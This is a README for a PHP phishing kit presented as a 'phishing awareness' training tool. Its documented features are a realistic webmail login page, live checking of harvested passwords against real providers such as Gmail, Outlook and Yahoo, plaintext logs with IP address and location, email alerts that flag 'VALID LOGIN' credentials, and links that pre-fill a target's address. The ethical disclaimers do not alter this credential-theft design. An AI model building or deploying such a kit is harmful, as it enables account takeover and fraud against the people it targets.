# Phishing Awareness System

A comprehensive phishing awareness testing system designed for ethical security training and awareness programs. This system tests SMTP credentials in real-time and logs all login attempts for analysis.

## ⚠️ IMPORTANT DISCLAIMER

This tool is designed for **ETHICAL PURPOSES ONLY** and should only be used in authorized phishing awareness programs with explicit permission from the organization. Unauthorized use of this system is illegal and unethical.

## Features

### 🔍 Advanced SMTP Testing
- Real-time SMTP credential validation
- Supports multiple email providers (Gmail, Outlook, Yahoo, etc.)
- Tests various SMTP configurations (ports, security protocols)
- Comprehensive error logging

### 📊 Detailed Logging
- Logs all login attempts (valid and invalid)
- Captures geolocation data
- Records browser information and IP addresses
- Tracks attempt numbers per session

### 🔒 Security Features
- Rate limiting to prevent abuse
- Input validation and sanitization
- CSRF protection
- Secure session management

### 📧 Email Notifications
- Real-time email alerts for all attempts
- Different notifications for valid vs invalid credentials
- HTML formatted reports with detailed information
- Configurable email templates

### 🎨 Professional UI
- Modern, responsive design
- Realistic webmail interface
- Loading animations and feedback
- Mobile-friendly layout

## Installation

1. **Requirements**
   - PHP 7.0 or higher
   - PHPMailer library
   - Web server (Apache, Nginx, etc.)

2. **Setup**
   ```bash
   # Clone or download the files
   # Upload to your web server
   # Ensure PHPMailer library is available
   ```

3. **Configuration**
   - Edit `config.php` with your SMTP settings
   - Update notification email address
   - Configure rate limiting and security settings

## Configuration

### Basic Settings (`config.php`)

```php
// Email notification settings
define('NOTIFICATION_EMAIL', 'your-email@domain.com');
define('SMTP_HOST', 'your-smtp-server.com');
define('SMTP_USERNAME', 'your-smtp-username');
define('SMTP_PASSWORD', 'your-smtp-password');
define('SMTP_PORT', 587);
define('SMTP_SECURITY', 'tls');
```

### Security Settings

```php
// Rate limiting
define('ENABLE_RATE_LIMITING', true);
define('RATE_LIMIT_MAX_ATTEMPTS', 20);
define('RATE_LIMIT_WINDOW', 3600); // 1 hour

// Other security options
define('MAX_ATTEMPTS_PER_IP', 50);
define('ENABLE_GEOLOCATION', true);
```

## File Structure

```
phishing-awareness-system/
├── index.html              # Main login form
├── postmailer.php         # Backend processing script
├── config.php             # Configuration settings
├── class.phpmailer.php    # PHPMailer library
├── class.smtp.php         # SMTP class
├── phishing_awareness_log.txt  # Log file (auto-created)
└── README.md              # This documentation
```

## Usage

### For Awareness Training

1. **Deploy the system** on your training server
2. **Configure email settings** in `config.php`
3. **Send the login URL** to training participants
4. **Monitor email notifications** for login attempts
5. **Review logs** for analysis and reporting

### URL Parameters

The system supports email pre-population via URL parameters:

```
https://your-domain.com/index.html?email=user@domain.com
https://your-domain.com/index.html#user@domain.com
```

### Log Analysis

The system creates detailed logs in `phishing_awareness_log.txt`:

```
=== LOGIN ATTEMPT #1 ===
Timestamp: 2025-01-10 15:30:45
Email: user@example.com
Password: userpassword123
IP Address: 192.168.1.100
Location: United States | New York
User Agent: Mozilla/5.0...
SMTP Server: smtp.example.com:587 (tls)
Status: VALID CREDENTIALS
==========================================
```

## Email Notifications

### Valid Credentials Alert
- Subject: ✅ VALID LOGIN - [Country] - [Email] - Attempt #[Number]
- Includes all login details and SMTP server information
- Green color scheme for easy identification

### Invalid Credentials Alert
- Subject: ❌ INVALID LOGIN - [Country] - [Email] - Attempt #[Number]
- Includes error details and attempt information
- Red color scheme for quick recognition

## Security Considerations

### For System Administrators

1. **Secure the backend files** - Ensure PHP files are not directly accessible
2. **Use HTTPS** - Always deploy over encrypted connections
3. **Monitor logs** - Regularly review system logs for anomalies
4. **Rate limiting** - Keep rate limiting enabled to prevent abuse
5. **Access control** - Restrict access to log files and configuration

### For Training Programs

1. **Get explicit permission** before deploying
2. **Inform participants** this is a training exercise
3. **Provide debriefing** after the exercise
4. **Secure data handling** - Protect any collected credentials
5. **Follow regulations** - Comply with privacy and security policies

## Troubleshooting

### Common Issues

1. **SMTP Connection Errors**
   - Check firewall settings
   - Verify SMTP credentials
   - Ensure correct ports are open

2. **Email Notifications Not Working**
   - Check notification email settings
   - Verify SMTP configuration
   - Check spam/junk folders

3. **Geolocation Not Working**
   - Check internet connectivity
   - API rate limits may apply
   - Consider alternative geolocation services

### Debug Mode

Enable debug mode in `config.php`:

```php
define('DEBUG_MODE', true);
```

This will log additional information to help diagnose issues.

## Legal and Ethical Guidelines

### ✅ Acceptable Use
- Authorized security awareness training
- Internal phishing simulations with permission
- Educational demonstrations with consent
- Security research in controlled environments

### ❌ Prohibited Use
- Unauthorized access to systems
- Collecting credentials without permission
- Targeting individuals without consent
- Any illegal or malicious activities

## Support

For issues or questions:

1. Check the troubleshooting section
2. Review configuration settings
3. Enable debug mode for more information
4. Consult your security team for guidance

## Changelog

### Version 2.0
- Enhanced SMTP testing capabilities
- Improved security features
- Better error handling and logging
- Modern responsive UI design
- Comprehensive configuration system

### Version 1.0
- Basic SMTP credential testing
- Email notifications
- Simple logging system

---

**Remember**: This tool is for authorized security awareness training only. Always obtain proper permission and follow your organization's security policies.